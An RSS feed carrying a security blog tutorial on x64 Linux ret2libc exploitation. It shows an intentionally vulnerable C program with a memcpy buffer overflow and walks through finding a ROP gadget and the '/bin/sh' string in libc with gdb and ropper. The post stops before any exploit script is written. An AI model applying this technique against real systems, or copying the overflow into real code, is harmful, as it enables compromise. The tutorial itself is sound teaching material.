<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>:~$ Knuckle$ecurity_</title>
    <description>Burak Baris</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Thu, 26 Jan 2023 13:58:37 +0000</pubDate>
    <lastBuildDate>Thu, 26 Jan 2023 13:58:37 +0000</lastBuildDate>
    <generator>Jekyll v4.2.1</generator>
    
      <item>
        <title>X64 Linux Binary Exploitation Part 2 Ret2Libc</title>
        <description>&lt;p&gt;In the previous post we have learned a general understanding on how registers, stack and the memory works 
when a binary is being executed. Furthermore, I have explained how to exploit a misconstrued C code and 
execute a shell code with using the stack.&lt;/p&gt;

&lt;p&gt;As you remember, when compiling the vulnerable C code, I have deactivated some built-in protection mechanisms 
that the compiler applies. I also said I will activate those step-by-step. In this paper, I will disable a 
stack protection mechanism called No eXecute (NX Bit) bit.&lt;/p&gt;

&lt;h1 id=&quot;no-execute-nx-bit&quot;&gt;No eXecute (NX Bit)&lt;/h1&gt;
&lt;p&gt;The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the 
binary as not executable. Therefore the stored input or data cannot be executed as code. 
This is significant because it prevents attackers from being able to jump to custom 
shellcode that they’ve stored on the stack or in a global variable.&lt;/p&gt;

&lt;p&gt;When we compiled the source code in the previous paper, I passed &lt;strong&gt;-z execstack&lt;/strong&gt; argument to the compiler, which 
makes the stack segment of the program executable. Therefore, when we inject shell code into the buffer, we could 
run it by making the RIP point to the starting address of our shell code.&lt;/p&gt;

&lt;p&gt;Since it is not possible to execute the shell code into the buffer when the NX bit is activated,
we will have to find a way to walk around that protection. We will still be modifying the RIP as we did before, 
however, in order to bypass that guard, we will not be pointing to the stack but to a different memory location.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;vulnerable-code&quot;&gt;Vulnerable Code&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This is the vulnerable code I will be using in this demo. The code we will use here is almost identical to the previous one
with one little tweak. Instead of using strcpy() this time I will be using memcpy() function. I will explain why I made this 
decision in the following sections but for now, to sum up, strcpy() has a built-in mechanism called &lt;strong&gt;null terminator&lt;/strong&gt;.
We do not want that. Do not worry, I will be explaining it in much detail.&lt;/p&gt;

&lt;p&gt;memcpy() function simply takes a destination buffer as it’s first argument and a source pointer as its second.
The third argument declares how many bytes will be written into the destination buffer read from the source.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;checking-the-nx-bit&quot;&gt;Checking the NX bit&lt;/h1&gt;
    &lt;p&gt;Let’s compile it.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; gcc &lt;span class=&quot;nt&quot;&gt;-no-pie&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; ret2libc.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ret2libc.elf &lt;span class=&quot;nt&quot;&gt;-D_FORTIFY_SOURCE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;
ret2libc.c: In &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘vuln’:
ret2libc.c:18:3: warning: ‘memcpy’ writing 300 bytes into a region of size 256 overflows the destination &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wstringop-overflow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=]&lt;/span&gt;
   18 |   memcpy&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buffer, input, 300&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      |   ^~~~~~~~~~~~~~~~~~~~~~~~~~
ret2libc.c:17:8: note: destination object ‘buffer’ of size 256
   17 |   char buffer[256]&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      |        ^~~~~~&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As you can see this time we do not pass the &lt;strong&gt;-z execstack&lt;/strong&gt; argument. Therefore, the stack is no longer executable and we 
no longer can execute any code in the stack segment.
Furthermore you can see the compiler screaming that it is not safe to write 300 bytes into a 256 byte array. Good for you compiler, 
we do not care.&lt;/p&gt;

&lt;p&gt;I will be disabling &lt;strong&gt;-fno-stack-protector –no-pie&lt;/strong&gt; and the &lt;strong&gt;-D_FORTIFY_SOURCE&lt;/strong&gt; protections in the following papers.&lt;/p&gt;

&lt;p&gt;Let’s check the NX bit.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;KnuckleSecurity :: -&amp;gt; gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ret2libc.elf
GEF &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linux ready, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;gef&lt;span class=&quot;s1&quot;&gt;&apos; to start, `gef config&apos;&lt;/span&gt; to configure
90 commands loaded and 5 functions added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GDB 12.1 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00ms using Python engine 3.10
Reading symbols from ret2libc.elf...
gef➤  checksec
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] checksec &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/home/burak/programming/reverse/ret2libc.elf&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; .gdbinit-gef.py:L8764 &lt;span class=&quot;s1&quot;&gt;&apos;checksec&apos;&lt;/span&gt; is deprecated and will be removed &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a feature release. Use Elf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fname&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.checksec&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
Canary                        : ✘
NX                            : ✓ &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- It is enabled. Stack is not executable.&lt;/span&gt;
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;what-is-libc&quot;&gt;What is libc?&lt;/h1&gt;
&lt;p&gt;The term “libc” is commonly used as a shorthand for the “standard
C library”, a library of standard functions that can be used by
all C programs (and sometimes by programs in other languages).
Because of some history, use of the term “libc” to
refer to the standard C library on Linux.&lt;/p&gt;

&lt;h1 id=&quot;attack-vector&quot;&gt;Attack Vector&lt;/h1&gt;

&lt;p&gt;Recall how you’re including external libraries in order to use the functions you did not 
manually define. libc contains both normal and system call functions within. We know the stack is not executable, but the 
.text segment has to be executable. Since .text segment contains the compiled machine instructions we write, we can set the EIP 
to point to the any instruction we think it is useful to us stored in the text segment.&lt;/p&gt;

&lt;p&gt;The trick is this; when the source code
includes a header file such as &lt;strong&gt;&amp;lt;stdlib.h&amp;gt;&lt;/strong&gt; in order to use &lt;strong&gt;exit()&lt;/strong&gt; function for instance, it also loads the assembled 
machine instructions of all 
the other functions comes with the &lt;strong&gt;&amp;lt;stdlib.h&amp;gt;&lt;/strong&gt; library into the memory regardless of whether they’re being called or not.
For instance, in that library, 
there is a function defined as &lt;strong&gt;system()&lt;/strong&gt; which executes the first argument given to it in the shell, which is useful.
Therefore, if we can 
point to that function and somehow pass the parameter we want to execute, we can abuse it to execute a shell.&lt;/p&gt;

&lt;p&gt;In this demo our aim is to call the &lt;strong&gt;system()&lt;/strong&gt; function and pass the &lt;strong&gt;/bin/sh&lt;/strong&gt; to it by abusing the memcpy().&lt;/p&gt;

&lt;p&gt;So let’s first try to understand how the system() function executes /bin/sh.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; gcc system.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; system.elf
KnuckleSecurity :: -&amp;gt; gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; system.elf
GEF &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linux ready, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;gef&lt;span class=&quot;s1&quot;&gt;&apos; to start, `gef config&apos;&lt;/span&gt; to configure
90 commands loaded and 5 functions added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GDB 12.1 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00ms using Python engine 3.10
Reading symbols from system.elf...
gef➤  disassemble main
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
   0x0000000000001139 &amp;lt;+0&amp;gt;:     push   rbp
   0x000000000000113a &amp;lt;+1&amp;gt;:     mov    rbp,rsp
   0x000000000000113d &amp;lt;+4&amp;gt;:     lea    rax,[rip+0xec0]        &lt;span class=&quot;c&quot;&gt;# 0x2004&lt;/span&gt;
   0x0000000000001144 &amp;lt;+11&amp;gt;:    mov    rdi,rax
   0x0000000000001147 &amp;lt;+14&amp;gt;:    call   0x1030 &amp;lt;system@plt&amp;gt;
   0x000000000000114c &amp;lt;+19&amp;gt;:    mov    eax,0x0
   0x0000000000001151 &amp;lt;+24&amp;gt;:    pop    rbp
   0x0000000000001152 &amp;lt;+25&amp;gt;:    ret
End of assembler dump.
gef➤  x/s 0x2004
0x2004: &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;First, main function completes its procedure prologue. And then writes the effective address of where the 
&lt;strong&gt;/bin/sh&lt;/strong&gt; string is stored to the accumulator. In the next step the accumulator is being copied to the 
destination index. And finally program calls for the system(). As you remember from the previous paper, 
you should be familiar with this function invocation. It is SysV calling convention. The RDI holds the value of 
the first argument given to the function before its call. Therefore, we now have a plan. We should 
somehow write to the RDI and set the RIP to the starting address of the system(), and that way we can 
spawn a shell.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;Step by step we will build a Python script to spawn a shell.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;finding-the-library&quot;&gt;Finding the library&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Before moving on, we first we need to find out in what address libc’s first instruction is being loaded 
in the program’s .text segment. We can list dynamic dependencies with &lt;strong&gt;ldd&lt;/strong&gt; command in linux.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; ldd ret2libc.elf
        linux-vdso.so.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x00007ffff7fc8000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /usr/lib/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x00007ffff7dbe000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- libc base address&lt;/span&gt;
        /lib64/ld-linux-x86-64.so.2 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /usr/lib64/ld-linux-x86-64.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x00007ffff7fca000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If we dump that object file, we will see all the instructions libc.so.6 includes.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /usr/lib/libc.so.6  | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n25&lt;/span&gt;

/usr/lib/libc.so.6:     file format elf64-x86-64


Disassembly of section .plt:

0000000000022000 &amp;lt;.plt&amp;gt;:
   22000:       ff 35 ea 5f 1b 00       push   QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rip+0x1b5fea]        &lt;span class=&quot;c&quot;&gt;# 1d7ff0 &amp;lt;h_errlist@@GLIBC_2.2.5+0xe30&amp;gt;&lt;/span&gt;
   22006:       f2 ff 25 eb 5f 1b 00    bnd jmp QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rip+0x1b5feb]        &lt;span class=&quot;c&quot;&gt;# 1d7ff8 &amp;lt;h_errlist@@GLIBC_2.2.5+0xe38&amp;gt;&lt;/span&gt;
   2200d:       0f 1f 00                nop    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax]
   22010:       f3 0f 1e fa             endbr64
   22014:       68 1f 00 00 00          push   0x1f
   22019:       f2 e9 e1 ff ff ff       bnd jmp 22000 &amp;lt;__h_errno@@GLIBC_PRIVATE+0x21f8c&amp;gt;
   2201f:       90                      nop
   22020:       f3 0f 1e fa             endbr64
   22024:       68 1e 00 00 00          push   0x1e
   22029:       f2 e9 d1 ff ff ff       bnd jmp 22000 &amp;lt;__h_errno@@GLIBC_PRIVATE+0x21f8c&amp;gt;
   2202f:       90                      nop
   22030:       f3 0f 1e fa             endbr64
   22034:       68 1d 00 00 00          push   0x1d
   22039:       f2 e9 c1 ff ff ff       bnd jmp 22000 &amp;lt;__h_errno@@GLIBC_PRIVATE+0x21f8c&amp;gt;
   2203f:       90                      nop
   22040:       f3 0f 1e fa             endbr64
   22044:       68 1c 00 00 00          push   0x1c
   22049:       f2 e9 b1 ff ff ff       bnd jmp 22000 &amp;lt;__h_errno@@GLIBC_PRIVATE+0x21f8c&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I have only printed out some instructions. There are 362635 instructions in that library. Those instructions involve 
the predefined functions such as system() or exit().&lt;/p&gt;

&lt;p&gt;Remember the plan, RDI should be pointing to a &lt;strong&gt;/bin/sh&lt;/strong&gt; string. So, how we can put that value in to the RDI?
We do not have manual access to write to that register. 
If we can put the address of the &lt;strong&gt;/bin/sh&lt;/strong&gt; string on top of the stack and find a ROP gadget (this is what each instruction in that 
dump file is called Therefore I will be referring those as the ROP gadgets) that pops the value from stack to the 
RDI, we can accomplish our first goal. POP instruction moves the value that sits on top of the stack to any destination and 
increments the stack pointer. Therefore, we are looking for a &lt;strong&gt;pop rdi&lt;/strong&gt; instruction. That ROP gadget also should 
immediately return since we do not want anything else to happen after POP operation. So, we are looking for &lt;strong&gt;pop rdi; ret&lt;/strong&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;rop-gadgets&quot;&gt;ROP Gadgets&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It is possible to find any ROP gadget with dumping the object file and manipulating the output. However, it is not the 
best way to do it. There is a program called &lt;a href=&quot;https://github.com/sashs/Ropper&quot;&gt;&lt;strong&gt;ropper&lt;/strong&gt;&lt;/a&gt; which exactly does the thing we are trying to do. We can search for 
any gadget with the &lt;strong&gt;ropper&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; ropper
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ropper&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt; file /usr/lib/libc.so.6 &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Declare the library which we want to search in.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Load gadgets from cache
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] loading... 100%
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] removing double gadgets... 100%
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] File loaded.
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;libc.so.6/ELF/x86_64&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt; search /1/ pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Search for pop rdi gadget&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;gadgets: pop rdi

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] File: /usr/lib/libc.so.6
0x0000000000107c71: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; call rax&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#&amp;lt;-- call rax, nope.&lt;/span&gt;
0x0000000000026634: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; jmp rax&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#&amp;lt;-- jmp rax, nope&lt;/span&gt;
0x00000000000d2854: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; jmp rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#&amp;lt;-- jmp rdi, nope.&lt;/span&gt;
0x0000000000023835: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- After popping the value to the rdi, it returns. That is what we are looking for.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you paid attention, the address is weird. That is because it is not its real address. It is the relative address 
of the gadget to library’s base address. Therefore:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;libc.so.6 base address = 0x00007ffff7dbe000&lt;/li&gt;
  &lt;li&gt;pop rdi; ret; relative address = 0x23835&lt;/li&gt;
  &lt;li&gt;pop rdi address = 0x7ffff7de1835&lt;/li&gt;
  &lt;li&gt;ret address = 0x7ffff7de1836&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s validate the addresses with using the GDB. I will set a break point on the main function and run 
the program since those addresses are not reachable if the program is not being executed.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;0x007fffffffe618│+0x0030: 0x483f8b5e097bf1b7
0x007fffffffe620│+0x0038: 0x0000000000000000
&lt;span class=&quot;nt&quot;&gt;-----code&lt;/span&gt;:x86:64 ────
     0x40111c &amp;lt;__do_global_dtors_aux+44&amp;gt; nop    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+0x0]
     0x401120 &amp;lt;frame_dummy+0&amp;gt;  endbr64
     0x401124 &amp;lt;frame_dummy+4&amp;gt;  jmp    0x4010b0 &amp;lt;register_tm_clones&amp;gt;
 →   0x401126 &amp;lt;main+0&amp;gt;         push   rbp
     0x401127 &amp;lt;main+1&amp;gt;         mov    rbp, rsp
     0x40112a &amp;lt;main+4&amp;gt;         sub    rsp, 0x10
     0x40112e &amp;lt;main+8&amp;gt;         mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4], edi
     0x401131 &amp;lt;main+11&amp;gt;        mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x10], rsi
     0x401135 &amp;lt;main+15&amp;gt;        cmp    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4], 0x1
&lt;span class=&quot;nt&quot;&gt;-----source&lt;/span&gt;:ret2libc.c+9 ────
      4  &lt;span class=&quot;c&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
      5
      6  void vuln&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;input&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      7
      8  int main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;int argc, char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;argv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 →    9  &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
     10    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;argc &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 1&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
     11      vuln&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;argv[1]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     12    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     13    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     14  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----threads&lt;/span&gt; ────
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] Id 1, Name: &quot;ret2libc.elf&quot;, stopped 0x401126 in main (), reason: BREAKPOINT&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----trace&lt;/span&gt; ────
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] 0x401126 → main(argc=0x7fff, argv=0x0)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;----ret2libc&lt;/span&gt;.elf 
gef➤  x/i 0x7ffff7de1835
   0x7ffff7de1835 &amp;lt;iconv+197&amp;gt;:  pop    rdi &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Perfect!&lt;/span&gt;
gef➤  x/i 0x7ffff7de1836
   0x7ffff7de1836 &amp;lt;iconv+198&amp;gt;:  ret &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Perfcet!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Addresses match. Now we need to find a pointer address which points to a /bin/sh string.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;KnuckleSecurity :: -&amp;gt; strings &lt;span class=&quot;nt&quot;&gt;-tx&lt;/span&gt; /usr/lib/libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; /bin/sh
 198031 /bin/sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Again, 0x198031 is the relative address to the starting address of the libc.so.6.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gef➤  x/s 0x00007ffff7dbe000+0x198031
0x7ffff7f56031: &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We now should find the address of the system() function in the libc.&lt;/p&gt;

